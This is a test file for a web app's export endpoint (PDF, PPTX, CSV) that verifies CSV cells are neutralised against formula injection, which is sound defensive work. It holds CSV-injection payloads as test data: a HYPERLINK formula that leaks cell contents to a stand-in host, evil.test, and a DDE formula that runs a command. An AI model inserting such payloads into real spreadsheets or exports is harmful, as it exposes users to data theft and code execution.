/**
 * F10. Export a run as PDF, PPTX and CSV. The CSV rows are the snapshot's
 * flow detail with an impact_unit column, and no cell a spreadsheet would
 * run as a formula (L5 / EXP-3).
 */
import { beforeAll, describe, expect, it } from 'vitest';
import { api } from '../support/api';
import { parseCsv } from '../support/csv';
import { snapshotOf, sqlOne } from '../support/db';
import { addFlow, createCase, createComponent, createProject, runAssessment } from '../support/world';
import { createUser, type TestUser } from '../support/users';

const EVIL_STEP = '=HYPERLINK("http://evil.test/?"&A1,"x")';
const EVIL_PROJECT = '=cmd|\' /C calc\'!A0';

let u: TestUser;
let viewer: TestUser;
let runId: number;
let caseName: string;
beforeAll(async () => {
  u = await createUser('f10');
  viewer = await createUser('f10viewer');
  const pid = await createProject(u, `${EVIL_PROJECT} ${u.id}`, { functional_unit: '+1 mug', lcia_method: 'CML 2001', region_code: 'US' });
  await api.post(`/api/projects/${pid}/members`, { token: u.token, json: { email: viewer.email, role: 'viewer' } });
  caseName = `@SUM(1+1) case ${u.id}`;
  const caseId = await createCase(u, pid, caseName);
  const product = await createComponent(u, caseId, { component_name: 'Mug', component_type: 'product', life_cycle_stage: 'production' });
  const evil = await createComponent(u, caseId, { component_name: EVIL_STEP, component_type: 'operation', parent_component_id: product, life_cycle_stage: 'materials' });
  const tabbed = await createComponent(u, caseId, { component_name: '\tTabbed step', component_type: 'operation', parent_component_id: product });
  const electricity = Number((await sqlOne(`SELECT substance_id FROM substances WHERE substance_name = 'Electricity'`)).substance_id);
  const gas = Number((await sqlOne(`SELECT substance_id FROM substances WHERE substance_name = 'Natural Gas'`)).substance_id);
  await addFlow(u, evil, { substance_id: electricity, flow_type: 'input', quantity: 2.5, unit: 'kWh' });
  await addFlow(u, tabbed, { substance_id: gas, flow_type: 'input', quantity: 1.8, unit: 'm3' });
  runId = Number((await runAssessment(u, caseId)).run_id);
});

describe('F10 export', () => {
  it('F10.1 PDF: application/pdf, %PDF- magic, attachment filename', async () => {
    const res = await api.get(`/api/assessments/${runId}/export?format=pdf`, { token: viewer.token });
    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toBe('application/pdf');
    expect(new TextDecoder('latin1').decode(res.bytes.slice(0, 5))).toBe('%PDF-');
    expect(res.headers.get('content-disposition')).toMatch(new RegExp(`^attachment; filename="LCAPIX_Report_[A-Za-z0-9_]+_${runId}\\.pdf"$`));
    expect(Number(res.headers.get('content-length'))).toBe(res.bytes.length);
  });

  it('F10.2 PPTX (and the "ppt" alias): the presentationml type and a PK zip header', async () => {
    for (const format of ['pptx', 'ppt']) {
      const res = await api.get(`/api/assessments/${runId}/export?format=${format}`, { token: viewer.token });
      expect(res.status).toBe(200);
      expect(res.headers.get('content-type')).toBe('application/vnd.openxmlformats-officedocument.presentationml.presentation');
      expect([...res.bytes.slice(0, 4)]).toEqual([0x50, 0x4b, 0x03, 0x04]);
      expect(res.headers.get('content-disposition')).toMatch(/\.pptx"$/);
    }
  });

  it('F10.3 CSV: header lines, the columns incl. impact_unit, one row per snapshot flow-detail row', async () => {
    const res = await api.get(`/api/assessments/${runId}/export?format=csv`, { token: viewer.token });
    expect(res.status).toBe(200);
    expect(res.headers.get('content-type')).toBe('text/csv; charset=utf-8');
    expect(res.headers.get('content-disposition')).toMatch(new RegExp(`LCAPIX_inventory_[A-Za-z0-9_]+_${runId}\\.csv"$`));
    const rows = parseCsv(res.text);
    const header = rows.findIndex((r) => r[0] === 'step');
    expect(rows[0][0]).toBe(`# LCAPIX assessment run ${runId}`);
    expect(rows.slice(0, header).map((r) => r[0].split(':')[0])).toEqual(
      expect.arrayContaining(['# Project', '# Case', '# Method', '# Functional unit', '# Exported']),
    );
    expect(rows[header]).toEqual([
      'step', 'life_cycle_stage', 'substance', 'direction', 'amount_entered', 'unit_entered', 'unit_conversion', 'factor',
      'factor_scope', 'factor_source', 'source_tier', 'allocation', 'impact_category', 'impact_value', 'impact_unit',
    ]);
    const data = rows.slice(header + 1).filter((r) => r.length > 1);
    const snap = await snapshotOf(runId);
    expect(data).toHaveLength(snap.flow_detail.length);
    const gw = data.filter((r) => r[12] === 'Global Warming');
    expect(gw.length).toBe(2);
    for (const r of gw) expect(r[14]).toMatch(/CO2/);
  });

  it('CSV cells and header lines that start with = + - @ TAB CR are neutralised (L5 / EXP-3)', async () => {
    const res = await api.get(`/api/assessments/${runId}/export?format=csv`, { token: u.token });
    const rows = parseCsv(res.text);
    const formula = /^[=+\-@\t\r]/;
    const numeric = /^[+-]?(\d+\.?\d*|\.\d+)(e[+-]?\d+)?$/i;
    for (const row of rows) {
      for (const cell of row) {
        if (formula.test(cell)) expect(numeric.test(cell), `live formula cell: ${JSON.stringify(cell)}`).toBe(true);
      }
    }
    const steps = rows.map((r) => r[0]);
    expect(steps).toContain(`'${EVIL_STEP}`);
    expect(steps).toContain("'\tTabbed step");
    // The raw formula never appears unprefixed at the start of a cell.
    expect(res.text).not.toMatch(/(^|,)"?=HYPERLINK/m);
    // Header lines start with "#", so a name there is not at the start of a cell.
    expect(rows.find((r) => r[0].startsWith('# Project:'))![0]).toContain(EVIL_PROJECT);
    expect(rows.find((r) => r[0].startsWith('# Case:'))![0]).toBe(`# Case: ${caseName}`);
  });

  it('400 for an unknown format (EXP-7 fixed); 404 for a missing run', async () => {
    const bad = await api.get(`/api/assessments/${runId}/export?format=docx`, { token: u.token });
    expect(bad.status).toBe(400);
    expect(bad.json.error).toMatch(/Unknown export format "docx"/);
    const long = await api.get(`/api/assessments/${runId}/export?format=${'x'.repeat(500)}`, { token: u.token });
    expect(long.status).toBe(400);
    expect(long.text.length).toBeLessThan(200);
    expect((await api.get('/api/assessments/2147480000/export?format=csv', { token: u.token })).status).toBe(404);
  });
});
